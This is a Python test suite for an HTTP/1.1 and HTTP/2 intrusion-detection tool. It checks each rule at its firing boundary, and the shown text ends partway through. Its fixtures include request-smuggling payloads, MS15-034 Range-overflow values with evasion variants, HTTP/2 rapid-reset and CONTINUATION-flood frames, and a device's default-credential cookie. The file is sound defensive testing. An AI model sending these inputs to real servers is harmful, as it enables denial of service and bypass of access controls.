#!/usr/bin/env python3
"""httpwatch self-test: every rule at its boundary, firing and not firing.

A rule is only trusted here if the test shows BOTH sides of its boundary:
the case one step inside stays silent, the case one step past fires. A test
that only ever proves the positive cannot catch a threshold slipping from
< to <=, which is the mutation that escaped in tlswatch.
"""
import sys, time
import httpwatch as hw

PASS = FAIL = 0
FAILURES = []


def check(name, cond):
    global PASS, FAIL
    if cond:
        PASS += 1
    else:
        FAIL += 1
        FAILURES.append(name)
        print(f"FAIL: {name}")


def codes(findings):
    return [f.code for f in findings]


def run1(raw, kind="request", service=None, banner=None):
    msg = hw.parse_message(raw, kind)
    if msg is None:
        return []
    return hw.analyse_http1_message(msg, raw, service=service,
                                    server_banner=banner)


def req(headers=b"", body=b"", line=b"POST /x HTTP/1.1", crlf=b"\r\n"):
    return line + crlf + headers + crlf + body


# ===========================================================================
# capture filter
# ===========================================================================
def test_bpf():
    f = hw.build_bpf([80])
    check("bpf: v4 port scoped", "tcp port 80" in f)
    check("bpf: bare ip6 term present", f.endswith("or ip6"))
    # The whole point of the Sept 2026 tlswatch fix: a port-only filter drops
    # IPv6 frames carrying extension headers. A filter with no bare ip6 term
    # is the bug, so assert the counterfactual is not what we generate.
    check("bpf: not port-only", f != "tcp port 80")
    f2 = hw.build_bpf([8080, 80, 80])
    check("bpf: ports deduped and sorted",
          f2 == "(tcp port 80 or tcp port 8080) or ip6")
    for bad in ([], [0], [65536], [-1]):
        try:
            hw.build_bpf(bad)
            check(f"bpf: rejects {bad}", False)
        except ValueError:
            check(f"bpf: rejects {bad}", True)


# ===========================================================================
# redaction
# ===========================================================================
def test_redaction():
    t = hw.redact("hunter2")
    check("redact: prefixed", t.startswith("sha256:"))
    check("redact: 8 hex digits", len(t) == len("sha256:") + 8)
    check("redact: no plaintext", "hunter2" not in t)
    check("redact: stable", t == hw.redact(b"hunter2"))
    check("redact: distinguishes", t != hw.redact("hunter3"))


# ===========================================================================
# Tier A
# ===========================================================================
def test_http_001_cl_te():
    f = run1(req(b"Host: a\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n"))
    check("001: CL+TE fires", "HTTP-001" in codes(f))
    f10 = run1(req(b"Host: a\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n",
                   line=b"POST /x HTTP/1.0"))
    got = [x for x in f10 if x.code == "HTTP-001"]
    check("001: HTTP/1.0 flagged (Netty CVE-2026-42584 shape)",
          got and got[0].evidence["http_10"] is True)
    check("001: HTTP/1.0 raises severity", got and got[0].severity == hw.HIGH)
    got11 = [x for x in f if x.code == "HTTP-001"]
    check("001: HTTP/1.1 stays warn", got11 and got11[0].severity == hw.WARN)
    silent = run1(req(b"Host: a\r\nContent-Length: 0\r\n"))
    check("001: CL alone silent", "HTTP-001" not in codes(silent))
    silent2 = run1(req(b"Host: a\r\nTransfer-Encoding: chunked\r\n", b"0\r\n\r\n"))
    check("001: TE alone silent", "HTTP-001" not in codes(silent2))


def test_http_002_te():
    for val, label in [
        (b"Chunked", "case variant"),
        (b"notchunked", "substring"),
        (b"chunked, gzip", "chunked not last"),
        (b"chunked\x0b", "non-token"),
    ]:
        f = run1(req(b"Host: a\r\nTransfer-Encoding: " + val + b"\r\n", b"0\r\n\r\n"))
        check(f"002: fires on {label}", "HTTP-002" in codes(f))
    clean = run1(req(b"Host: a\r\nTransfer-Encoding: chunked\r\n", b"0\r\n\r\n"))
    check("002: clean chunked silent", "HTTP-002" not in codes(clean))
    gz = run1(req(b"Host: a\r\nTransfer-Encoding: gzip, chunked\r\n", b"0\r\n\r\n"))
    check("002: gzip,chunked silent", "HTTP-002" not in codes(gz))
    # case folding must still FRAME it as chunked, per RFC 9112 7
    te = hw.analyse_transfer_encoding([b"Chunked"])
    check("002: case variant still treated as chunked", te["chunked"] is True)
    te2 = hw.analyse_transfer_encoding([b"notchunked"])
    check("002: notchunked NOT treated as chunked", te2["chunked"] is False)


def test_http_003_cl():
    for val, label in [(b"+0", "signed"), (b"1 2", "space"),
                       (b"0x10", "hex"), (b"", "empty")]:
        f = run1(req(b"Host: a\r\nContent-Length: " + val + b"\r\n"))
        check(f"003: fires on {label}", "HTTP-003" in codes(f))
    f = run1(req(b"Host: a\r\nContent-Length: 0\r\nContent-Length: 5\r\n"))
    check("003: conflicting values fire", "HTTP-003" in codes(f))
    clean = run1(req(b"Host: a\r\nContent-Length: 0\r\n"))
    check("003: plain digits silent", "HTTP-003" not in codes(clean))
    v, d = hw.parse_content_length([b"0"])
    check("003: zero parses as 0 not None", v == 0 and not d)


def test_http_004_chunk_size():
    body = b"1\r\nA\r\n0\r\n\r\n"
    clean = run1(req(b"Host: a\r\nTransfer-Encoding: chunked\r\n", body))
    check("004: valid chunk silent", "HTTP-004" not in codes(clean))
    bad = run1(req(b"Host: a\r\nTransfer-Encoding: chunked\r\n",
                   b"1g\r\nA\r\n0\r\n\r\n"))
    check("004: non-hex size fires", "HTTP-004" in codes(bad))
    # boundary: 16 hex digits is the 64-bit limit, 17 is past it
    sixteen = b"f" * 16
    seventeen = b"f" * 17
    ok = run1(req(b"Host: a\r\nTransfer-Encoding: chunked\r\n",
                  sixteen + b"\r\nA"))
    check("004: 16 hex digits silent", "HTTP-004" not in codes(ok))
    over = run1(req(b"Host: a\r\nTransfer-Encoding: chunked\r\n",
                    seventeen + b"\r\nA"))
    check("004: 17 hex digits fires", "HTTP-004" in codes(over))


def test_http_005_chunk_ext():
    # the published Jetty/Netty smuggling shape
    body = b'1;ext="val\r\nX\r\n0\r\n\r\n'
    f = run1(req(b"Host: a\r\nTransfer-Encoding: chunked\r\n", body))
    check("005: unclosed quote fires", "HTTP-005" in codes(f))
    good = run1(req(b"Host: a\r\nTransfer-Encoding: chunked\r\n",
                    b'1;ext="val"\r\nA\r\n0\r\n\r\n'))
    check("005: closed quote silent", "HTTP-005" not in codes(good))
    noext = run1(req(b"Host: a\r\nTransfer-Encoding: chunked\r\n",
                     b"1\r\nA\r\n0\r\n\r\n"))
    check("005: no extension silent", "HTTP-005" not in codes(noext))
    check("005: escaped quote inside string is not unclosed",
          "unclosed_quoted_string" not in hw._scan_chunk_ext(b'a="x\\"y"'))
    check("005: bare quote is unclosed",
          "unclosed_quoted_string" in hw._scan_chunk_ext(b'a="xy'))
    # boundary on the size cap
    ext_ok = b"a=" + b"z" * (hw.MAX_CHUNK_EXT - 2)
    ext_over = b"a=" + b"z" * (hw.MAX_CHUNK_EXT - 1)
    check("005: ext at cap silent",
          "chunk_ext_oversized" not in hw._scan_chunk_ext(ext_ok))
    check("005: ext one past cap fires",
          "chunk_ext_oversized" in hw._scan_chunk_ext(ext_over))


def test_http_006_007_008():
    lf = b"POST /x HTTP/1.1\nHost: a\n\n"
    f = run1(lf)
    check("006: bare LF fires", "HTTP-006" in codes(f))
    clean = run1(req(b"Host: a\r\n"))
    check("006: CRLF silent", "HTTP-006" not in codes(clean))
    ws = run1(req(b"Host : a\r\n"))
    check("007: space before colon fires", "HTTP-007" in codes(ws))
    check("007: normal header silent", "HTTP-007" not in codes(clean))
    fold = run1(req(b"Host: a\r\nX-Long: one\r\n two\r\n"))
    check("008: obs-fold fires", "HTTP-008" in codes(fold))
    check("008: no fold silent", "HTTP-008" not in codes(clean))
    resp = hw.parse_message(b"HTTP/1.1 200 OK\r\nX: one\r\n two\r\n\r\n", "response")
    rf = hw.analyse_http1_message(resp, b"HTTP/1.1 200 OK\r\nX: one\r\n two\r\n\r\n")
    check("008: obs-fold in RESPONSE does not fire (request-only rule)",
          "HTTP-008" not in codes(rf))


def test_http_009_framer_disagreement():
    smuggled = b"GET /admin HTTP/1.1\r\nHost: a\r\n\r\n"
    body = b"0\r\n\r\n" + smuggled
    raw = req(b"Host: a\r\nContent-Length: " + str(len(body)).encode() +
              b"\r\nTransfer-Encoding: chunked\r\n", body)
    f = run1(raw)
    got = [x for x in f if x.code == "HTTP-009"]
    check("009: TE.CL smuggle fires", bool(got))
    check("009: smuggled request line captured",
          got and got[0].evidence["smuggled_request_line"].startswith("GET /admin"))
    check("009: severity critical", got and got[0].severity == hw.CRITICAL)
    # agreeing framers: no finding even though both headers are present
    agree_body = b"0\r\n\r\n"
    agree = req(b"Host: a\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n",
                agree_body)
    check("009: agreeing offsets silent", "HTTP-009" not in codes(run1(agree)))
    # a difference that is NOT a request line is not a smuggled request
    junk = b"0\r\n\r\n" + b"just some trailing bytes\r\n"
    jraw = req(b"Host: a\r\nContent-Length: " + str(len(junk)).encode() +
               b"\r\nTransfer-Encoding: chunked\r\n", junk)
    check("009: non-request remainder silent", "HTTP-009" not in codes(run1(jraw)))


def test_http_010_response():
    r = b"HTTP/1.1 200 OK\r\nContent-Length: +0\r\n\r\n"
    check("010: invalid CL in response fires", "HTTP-010" in codes(run1(r, "response")))
    ok = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
    check("010: clean response silent", "HTTP-010" not in codes(run1(ok, "response")))


def test_http_011_host():
    f = run1(req(b"Host: a\r\nHost: b\r\n"))
    check("011: duplicate Host fires", "HTTP-011" in codes(f))
    f2 = run1(req(b"Host: evil.example\r\n",
                  line=b"GET http://good.example/x HTTP/1.1"))
    check("011: absolute-URI mismatch fires", "HTTP-011" in codes(f2))
    f3 = run1(req(b"Host: good.example\r\n",
                  line=b"GET http://good.example/x HTTP/1.1"))
    check("011: matching absolute-URI silent", "HTTP-011" not in codes(f3))
    check("011: plain request silent", "HTTP-011" not in codes(run1(req(b"Host: a\r\n"))))


# ===========================================================================
# Tier B
# ===========================================================================
def test_http_020_range():
    exact = run1(req(b"Host: a\r\nRange: bytes=0-18446744073709551615\r\n",
                     line=b"GET /x HTTP/1.1"))
    got = [x for x in exact if x.code == "HTTP-020"]
    check("020: MS15-034 exact value fires", bool(got))
    check("020: exact flag set", got and got[0].evidence["exact_ms15_034"] is True)
    # boundary: 2**63-1 is silent, 2**63 fires
    under = run1(req(b"Host: a\r\nRange: bytes=0-" +
                     str((1 << 63) - 1).encode() + b"\r\n", line=b"GET /x HTTP/1.1"))
    check("020: 2**63-1 silent", "HTTP-020" not in codes(under))
    at = run1(req(b"Host: a\r\nRange: bytes=0-" + str(1 << 63).encode() + b"\r\n",
                  line=b"GET /x HTTP/1.1"))
    check("020: 2**63 fires", "HTTP-020" in codes(at))
    normal = run1(req(b"Host: a\r\nRange: bytes=0-1023\r\n", line=b"GET /x HTTP/1.1"))
    check("020: ordinary range silent", "HTTP-020" not in codes(normal))
    # documented evasions must not defeat the rule
    ws = run1(req(b"Host: a\r\nRange: bytes= 0 - 18446744073709551615 \r\n",
                  line=b"GET /x HTTP/1.1"))
    check("020: whitespace evasion still fires", "HTTP-020" in codes(ws))
    multi = run1(req(b"Host: a\r\nRange: bytes=0-100,200-18446744073709551615\r\n",
                     line=b"GET /x HTTP/1.1"))
    check("020: multi-range evasion still fires", "HTTP-020" in codes(multi))
    nounit = run1(req(b"Host: a\r\nRange: 0-18446744073709551615\r\n",
                      line=b"GET /x HTTP/1.1"))
    check("020: missing unit still fires", "HTTP-020" in codes(nounit))

    # Published evasion variants (Didier Stevens, 2015-04-17). A string-match
    # signature misses these; integer parsing catches them. The first two
    # were reported to crash a test host, so missing them is not academic.
    for label, val in [
        ("spaces around separators", b"bytes = 2 - 18446744073709551615"),
        ("leading zero", b"bytes=2-018446744073709551615"),
        ("multiple ranges", b"bytes=2-3,4-18446744073709551615"),
        ("overlapping ranges", b"bytes=2-4,2-18446744073709551615"),
        ("tab after dash", b"bytes=2-\t18446744073709551615"),
    ]:
        raw = (b"GET /x HTTP/1.1\r\nHost: a\r\nRange: " + val + b"\r\n\r\n")
        check(f"020: evasion variant fires - {label}", "HTTP-020" in codes(run1(raw)))


def test_http_021_accept_encoding():
    f = run1(req(b"Host: a\r\nAccept-Encoding: gzip, aaaa,,\r\n",
                 line=b"GET /x HTTP/1.1"))
    check("021: unknown coding + empty element fires", "HTTP-021" in codes(f))
    # empty element with only KNOWN codings is not the arming condition
    known = run1(req(b"Host: a\r\nAccept-Encoding: gzip,,deflate\r\n",
                     line=b"GET /x HTTP/1.1"))
    check("021: empty element with known codings silent",
          "HTTP-021" not in codes(known))
    # unknown coding with no empty element is just an unknown coding
    noempty = run1(req(b"Host: a\r\nAccept-Encoding: gzip, aaaa\r\n",
                       line=b"GET /x HTTP/1.1"))
    check("021: unknown coding alone silent", "HTTP-021" not in codes(noempty))
    plain = run1(req(b"Host: a\r\nAccept-Encoding: gzip, deflate, br\r\n",
                     line=b"GET /x HTTP/1.1"))
    check("021: ordinary header silent", "HTTP-021" not in codes(plain))


def test_http_022_trailers():
    body = b"1;x=y\r\nA\r\n0\r\nX-Test: 1\r\n\r\n"
    hdrs = b"Host: a\r\nTransfer-Encoding: chunked\r\nTrailer: X-Test\r\n"
    f = run1(req(hdrs, body))
    got = [x for x in f if x.code == "HTTP-022"]
    check("022: request trailers fire", bool(got))
    check("022: precondition_unobserved recorded",
          got and got[0].evidence["precondition_unobserved"] is True)
    check("022: info without a banner", got and got[0].severity == hw.INFO)
    fb = run1(req(hdrs, body), banner=b"Microsoft-HTTPAPI/2.0")
    gotb = [x for x in fb if x.code == "HTTP-022"]
    check("022: warn with http.sys banner", gotb and gotb[0].severity == hw.WARN)
    notr = run1(req(b"Host: a\r\nTransfer-Encoding: chunked\r\n", b"0\r\n\r\n"))
    check("022: chunked without trailers silent", "HTTP-022" not in codes(notr))


# ===========================================================================
# Tier C
# ===========================================================================
def test_tier_c_credentials():
    import base64
    tok = base64.b64encode(b"admin:hunter2")
    f = run1(req(b"Host: a\r\nAuthorization: Basic " + tok + b"\r\n"))
    got = [x for x in f if x.code == "HTTP-040"]
    check("040: basic auth fires", bool(got))
    check("040: username reported", got and got[0].evidence["username"] == "admin")
    blob = str(got[0].to_dict())
    check("040: password NOT in the finding", "hunter2" not in blob)
    check("040: credential hashed", "sha256:" in blob)
    # rpcwatch owns WinRM auth posture
    sup = run1(req(b"Host: a\r\nAuthorization: Basic " + tok + b"\r\n"),
               service="winrm")
    check("040: suppressed on winrm", "HTTP-040" not in codes(sup))
    check("040: fires on plain http service",
          "HTTP-040" in codes(run1(req(b"Host: a\r\nAuthorization: Basic " + tok +
                                       b"\r\n"), service="http")))

    form = req(b"Host: a\r\nContent-Type: application/x-www-form-urlencoded\r\n"
               b"Content-Length: 24\r\n", b"user=admin&password=s3cr3t")
    ff = run1(form)
    check("041: form password fires", "HTTP-041" in codes(ff))
    check("041: password not echoed", "s3cr3t" not in str([x.to_dict() for x in ff]))
    nopw = run1(req(b"Host: a\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                    b"Content-Length: 10\r\n", b"user=admin"))
    check("041: no password field silent", "HTTP-041" not in codes(nopw))
    json_body = run1(req(b"Host: a\r\nContent-Type: application/json\r\n"
                         b"Content-Length: 22\r\n", b'{"password":"s3cr3t"}'))
    check("041: non-form content-type silent", "HTTP-041" not in codes(json_body))


def test_http_043_fs_cookie():
    ck = (b"Host: a\r\nCookie: username=YWRtaW4=; password=cGFzcw==; "
          b"GSESSIONID=deadbeef\r\n")
    f = run1(req(ck))
    got = [x for x in f if x.code == "HTTP-043"]
    check("043: FS triple fires", bool(got))
    check("043: generic 042 suppressed on the same observation",
          "HTTP-042" not in codes(f))
    check("043: says verify, not vulnerable",
          got and "verify this device" in got[0].evidence["note"])
    check("043: cookie values hashed",
          got and got[0].evidence["password_cookie"].startswith("sha256:"))
    # GET still matches: the credentials cross on every request, not only
    # POST. The method is recorded as evidence, not used as a gate. (This
    # replaced an earlier POST-only assertion that encoded a real bug: a
    # browser returns the cookie on GETs too, so a POST gate dropped them.)
    g = run1(req(ck, line=b"GET /x HTTP/1.1"))
    check("043: GET also matches the FS triple", "HTTP-043" in codes(g))
    check("043: 042 suppressed on the GET too", "HTTP-042" not in codes(g))
    gots = [x for x in g if x.code == "HTTP-043"]
    check("043: method recorded as evidence", gots and gots[0].evidence["method"] == "GET")
    # two of three keys is not the triple
    partial = run1(req(b"Host: a\r\nCookie: username=a; GSESSIONID=b\r\n"))
    check("043: partial triple silent", "HTTP-043" not in codes(partial))
    plain = run1(req(b"Host: a\r\nCookie: session=abc123\r\n"))
    check("042: ordinary session cookie silent", "HTTP-042" not in codes(plain))

    # The literal cookie from the SwiftSecur S3150-8T2F research wiki.
    # 'YWRtaW4=' is base64 'admin'. Must fire on the methods a real client
    # uses, not only POST - the credentials cross on every request.
    real = (b"Host: a\r\nCookie: username=YWRtaW4=; password=YWRtaW4=; "
            b"GSESSIONID=2F5642352C2C7C5C535C528644\r\n")
    for line in (b"POST /ios.asp HTTP/1.1", b"GET /logo.asp HTTP/1.1",
                 b"GET /timerangelist.asp HTTP/1.1"):
        got = run1(req(real, line=line))
        check(f"043: real FS cookie fires on {line.split(b' ')[0].decode()}",
              "HTTP-043" in codes(got))
    # the secret is never emitted even for the real cookie
    blob = str([f.to_dict() for f in run1(req(real, line=b"GET / HTTP/1.1"))])
    check("043: real credential value never appears in output",
          "YWRtaW4=" not in blob)


def test_http_044_045():
    f = run1(req(b"Host: a\r\n", line=b"GET http://u:p@a/x HTTP/1.1"))
    check("044: userinfo fires", "HTTP-044" in codes(f))
    q = run1(req(b"Host: a\r\n", line=b"GET /login?user=a&password=zz HTTP/1.1"))
    check("044: query password fires", "HTTP-044" in codes(q))
    check("044: query password hashed",
          "zz" not in str([x.evidence for x in q if x.code == "HTTP-044"])
          or "sha256:" in str([x.evidence for x in q if x.code == "HTTP-044"]))
    clean = run1(req(b"Host: a\r\n", line=b"GET /x?page=2 HTTP/1.1"))
    check("044: ordinary query silent", "HTTP-044" not in codes(clean))
    t = run1(req(b"Host: a\r\n", line=b"TRACE /x HTTP/1.1"))
    check("045: TRACE fires", "HTTP-045" in codes(t))
    check("045: GET silent", "HTTP-045" not in codes(clean))


def test_slow_tracker():
    st = hw.SlowTracker()
    # within the grace period nothing is slow, however few bytes arrived
    check("046: inside grace not slow", st.is_slow(1, hw.SLOW_HEADER_GRACE, hw.SLOW_HEADER_GRACE) is False)
    # past grace, below the minimum rate
    check("046: below min rate is slow", st.is_slow(100, 30.0, 20.0) is True)
    check("046: at min rate is not slow", st.is_slow(int(500 * 30.0), 30.0, 20.0) is False)
    now = 1000.0
    fired = None
    for i in range(hw.SLOW_SOURCE_THRESHOLD):
        fired = st.record("10.0.0.1", "headers", now) or fired
    check("046: at threshold silent (one slow client is a mobile client)",
          fired is None)
    f = st.record("10.0.0.1", "headers", now)
    check("046: one past threshold fires", f is not None and f.code == "HTTP-046")
    again = st.record("10.0.0.1", "headers", now)
    check("046: latched, not repeated per flow", again is None)
    st2 = hw.SlowTracker()
    for i in range(hw.SLOW_SOURCE_THRESHOLD + 1):
        r = st2.record("10.0.0.2", "body", now)
    check("047: body kind yields HTTP-047", r is not None and r.code == "HTTP-047")
    # the window must actually expire
    st3 = hw.SlowTracker()
    for i in range(hw.SLOW_SOURCE_THRESHOLD + 1):
        r3 = st3.record("10.0.0.3", "headers", now + i * 10)
    check("046: spread beyond the window does not fire", r3 is None)


# ===========================================================================
# HPACK
# ===========================================================================
def test_hpack_integer():
    v, pos, d = hw.decode_integer(bytes([10]), 0, 5)
    check("hpack: small integer", v == 10 and pos == 1 and not d)
    v, pos, d = hw.decode_integer(bytes([31, 154, 10]), 0, 5)
    check("hpack: RFC 7541 C.1.1 1337", v == 1337 and not d)
    # the CVE-2023-33953 varint vector: a trailing zero continuation group
    v, pos, d = hw.decode_integer(bytes([31, 0x80, 0x00]), 0, 5)
    check("hpack: trailing zero group flagged",
          "integer_trailing_zero_group" in d)
    check("hpack: value still decoded", v == 31)
    # one group, final byte 0x00: legal, value 31+0
    v, pos, d = hw.decode_integer(bytes([31, 0x00]), 0, 5)
    check("hpack: single zero group is legal (no defect)",
          "integer_trailing_zero_group" not in d and v == 31)
    try:
        hw.decode_integer(bytes([31] + [0x80] * 12), 0, 5)
        check("hpack: runaway continuation rejected", False)
    except hw.HpackError:
        check("hpack: runaway continuation rejected", True)


def test_hpack_huffman():
    # RFC 7541 C.4.1: "www.example.com" huffman-encoded
    enc = bytes.fromhex("f1e3c2e5f23a6ba0ab90f4ff")
    check("hpack: huffman C.4.1", hw.HUFFMAN.decode(enc) == b"www.example.com")
    enc2 = bytes.fromhex("a8eb10649cbf")   # C.4.2 "no-cache"
    check("hpack: huffman C.4.2", hw.HUFFMAN.decode(enc2) == b"no-cache")


def test_hpack_decode_blocks():
    d = hw.HpackDecoder()
    # RFC 7541 C.3.1 request
    block = bytes.fromhex("828684410f7777772e6578616d706c652e636f6d")
    headers, defects = d.decode(block)
    hmap = dict(headers)
    check("hpack: C.3.1 method", hmap[b":method"] == b"GET")
    check("hpack: C.3.1 path", hmap[b":path"] == b"/")
    check("hpack: C.3.1 authority", hmap[b":authority"] == b"www.example.com")
    check("hpack: C.3.1 no defects", not defects)
    check("hpack: dynamic table grew", len(d.table) == 1)
    # C.3.2 relies on the table built by C.3.1
    block2 = bytes.fromhex("828684be58086e6f2d6361636865")
    headers2, _ = d.decode(block2)
    check("hpack: C.3.2 uses dynamic entry",
          (b"cache-control", b"no-cache") in headers2)
    check("hpack: C.3.2 authority from table",
          (b":authority", b"www.example.com") in headers2)


def test_hpack_unsynced():
    st = hw.H2ConnectionState("f", synced=False)
    check("hpack: unsynced decoder marked", st.dec_client.synced is False)


# ===========================================================================
# Tier D
# ===========================================================================
def mkframe(ftype, flags, sid, payload=b""):
    return (len(payload).to_bytes(3, "big") + bytes([ftype, flags]) +
            sid.to_bytes(4, "big") + payload)


def settings_payload(**kw):
    out = b""
    for ident, val in kw.items():
        out += ident.to_bytes(2, "big") + val.to_bytes(4, "big")
    return out


def test_frame_parser():
    buf = mkframe(hw.FRAME_SETTINGS, 0, 0) + mkframe(hw.FRAME_PING, 0, 0, b"12345678")
    frames, consumed = hw.parse_frames(buf)
    check("h2: two frames parsed", len(frames) == 2)
    check("h2: all bytes consumed", consumed == len(buf))
    partial = buf[:-3]
    frames2, consumed2 = hw.parse_frames(partial)
    check("h2: partial frame held back", len(frames2) == 1)
    check("h2: consumed stops at frame boundary", consumed2 == 9)
    padded = hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_PADDED, 1,
                        bytes([2]) + b"AB" + b"\x00\x00")
    check("h2: padding stripped", hw.strip_header_padding(padded) == b"AB")
    prio = hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_PRIORITY, 1,
                      b"\x00\x00\x00\x00\x00" + b"AB")
    check("h2: priority fields stripped", hw.strip_header_padding(prio) == b"AB")


def test_http_061_rapid_reset():
    st = hw.H2ConnectionState("f")
    st.feed([hw.H2Frame(0, hw.FRAME_SETTINGS, 0, 0,
                        settings_payload(**{str(hw.SETTINGS_MAX_CONCURRENT_STREAMS): 0})
                        if False else
                        hw.SETTINGS_MAX_CONCURRENT_STREAMS.to_bytes(2, "big") +
                        (10).to_bytes(4, "big"))], from_client=False, now=0.0)
    check("061: settings observed", st.peer_max_concurrent == 10)
    threshold = max(2, int(10 * hw.RAPID_RESET_MULTIPLIER))
    out = []
    for i in range(1, threshold + 1):
        sid = i * 2 + 1
        out += st.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, sid, b"")],
                       from_client=True, now=0.1)
        out += st.feed([hw.H2Frame(0, hw.FRAME_RST_STREAM, 0, sid, b"\x00" * 4)],
                       from_client=True, now=0.1)
    check("061: at threshold silent", "HTTP-061" not in codes(out))
    sid = (threshold + 2) * 2 + 1
    st.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, sid, b"")],
            from_client=True, now=0.1)
    more = st.feed([hw.H2Frame(0, hw.FRAME_RST_STREAM, 0, sid, b"\x00" * 4)],
                   from_client=True, now=0.1)
    check("061: one past threshold fires", "HTTP-061" in codes(more))

    # a stream the server answered before the reset is an ordinary cancel
    st2 = hw.H2ConnectionState("g")
    st2.peer_max_concurrent = 2
    out2 = []
    for i in range(1, 20):
        sid = i * 2 + 1
        out2 += st2.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, sid, b"")],
                         from_client=True, now=0.1)
        out2 += st2.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, sid, b"")],
                         from_client=False, now=0.1)
        out2 += st2.feed([hw.H2Frame(0, hw.FRAME_RST_STREAM, 0, sid, b"\x00" * 4)],
                         from_client=True, now=0.1)
    check("061: answered-then-cancelled streams do not count (gRPC deadlines)",
          "HTTP-061" not in codes(out2))

    # resets spread wider than the window must not accumulate
    st3 = hw.H2ConnectionState("h")
    st3.peer_max_concurrent = 2
    out3 = []
    for i in range(1, 20):
        sid = i * 2 + 1
        out3 += st3.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, sid, b"")],
                         from_client=True, now=float(i) * 2)
        out3 += st3.feed([hw.H2Frame(0, hw.FRAME_RST_STREAM, 0, sid, b"\x00" * 4)],
                         from_client=True, now=float(i) * 2)
    check("061: resets outside the window do not accumulate",
          "HTTP-061" not in codes(out3))


def test_http_062_continuation():
    # interruption: RFC 9113 6.10, no benign reading
    st = hw.H2ConnectionState("f")
    out = st.feed([
        hw.H2Frame(0, hw.FRAME_HEADERS, 0, 1, b"AB"),
        hw.H2Frame(0, hw.FRAME_DATA, 0, 1, b"xx"),
    ], from_client=True, now=0.0)
    got = [x for x in out if x.code == "HTTP-062"]
    check("062: interrupted header block fires", bool(got))
    check("062: reason recorded",
          got and got[0].evidence["reason"].startswith("interrupted_by"))

    # oversize against the peer's own advertised limit
    st2 = hw.H2ConnectionState("g")
    st2.feed([hw.H2Frame(0, hw.FRAME_SETTINGS, 0, 0,
                         hw.SETTINGS_MAX_HEADER_LIST_SIZE.to_bytes(2, "big") +
                         (100).to_bytes(4, "big"))], from_client=False, now=0.0)
    check("062: peer limit observed", st2.peer_max_header_list == 100)
    small = st2.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, 1,
                                 b"\x00" * 100)], from_client=True, now=0.0)
    check("062: block at the peer limit silent",
          not [x for x in small if x.evidence.get("reason") ==
               "header_block_exceeds_peer_limit"])
    st2b = hw.H2ConnectionState("g2")
    st2b.peer_max_header_list = 100
    big = st2b.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, 1,
                                b"\x00" * 101)], from_client=True, now=0.0)
    check("062: block one byte past the peer limit fires",
          any(x.evidence.get("reason") == "header_block_exceeds_peer_limit"
              for x in big))

    # frame-count boundary
    st3 = hw.H2ConnectionState("h")
    st3.peer_max_header_list = 1 << 20
    frames = [hw.H2Frame(0, hw.FRAME_HEADERS, 0, 1, b"")]
    for i in range(hw.MAX_CONTINUATION_FRAMES - 1):
        frames.append(hw.H2Frame(0, hw.FRAME_CONTINUATION, 0, 1, b""))
    frames.append(hw.H2Frame(0, hw.FRAME_CONTINUATION, hw.FLAG_END_HEADERS, 1, b""))
    out3 = st3.feed(frames, from_client=True, now=0.0)
    check("062: at the frame cap silent",
          not any(x.evidence.get("reason") == "excessive_continuation_frames"
                  for x in out3))
    st4 = hw.H2ConnectionState("i")
    st4.peer_max_header_list = 1 << 20
    frames2 = [hw.H2Frame(0, hw.FRAME_HEADERS, 0, 1, b"")]
    for i in range(hw.MAX_CONTINUATION_FRAMES):
        frames2.append(hw.H2Frame(0, hw.FRAME_CONTINUATION, 0, 1, b""))
    frames2.append(hw.H2Frame(0, hw.FRAME_CONTINUATION, hw.FLAG_END_HEADERS, 1, b""))
    out4 = st4.feed(frames2, from_client=True, now=0.0)
    check("062: one past the frame cap fires",
          any(x.evidence.get("reason") == "excessive_continuation_frames"
              for x in out4))

    # a clean single HEADERS frame says nothing
    st5 = hw.H2ConnectionState("j")
    clean = st5.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, 1,
                                 bytes.fromhex("8286"))],
                     from_client=True, now=0.0)
    check("062: clean header block silent", "HTTP-062" not in codes(clean))


def encode_literal(name: bytes, value: bytes) -> bytes:
    """Literal header field without indexing, new name, no huffman."""
    return (b"\x00" + bytes([len(name)]) + name +
            bytes([len(value)]) + value)


def test_http_063_hpack_overlong():
    st = hw.H2ConnectionState("f")
    # an indexed field whose index was encoded with a trailing zero group
    block = bytes([0xFF, 0x80, 0x00]) + b""   # index 127 + 0, padded
    out = st.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, 1, block)],
                  from_client=True, now=0.0)
    # index 127 is out of range for an empty dynamic table -> decode error.
    # Use a valid padded index instead: 31+0 in a 5-bit prefix is a table
    # size update, so use a 7-bit prefix indexed field for index 127.
    check("063: padded varint produces a finding or a decode error",
          "HTTP-063" in codes(out) or "HTTP-062" in codes(out))

    st2 = hw.H2ConnectionState("g")
    # build it properly: indexed field, index 2 (:method GET) is 0x82 and
    # needs no continuation, so pad a literal's NAME LENGTH instead
    padded_len = bytes([0x00, 0x7F, 0x80, 0x00])  # literal, name len 127+0
    name = b"x" * 127
    block2 = padded_len + name + bytes([1]) + b"v"
    out2 = st2.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, 1, block2)],
                    from_client=True, now=0.0)
    got = [x for x in out2 if x.code == "HTTP-063"]
    check("063: trailing zero group in a string length fires", bool(got))

    st3 = hw.H2ConnectionState("h")
    clean = encode_literal(b"x" * 127, b"v")
    out3 = st3.feed([hw.H2Frame(0, hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, 1,
                                clean)], from_client=True, now=0.0)
    check("063: same length encoded minimally is silent",
          "HTTP-063" not in codes(out3))


def test_http_064_065_grpc():
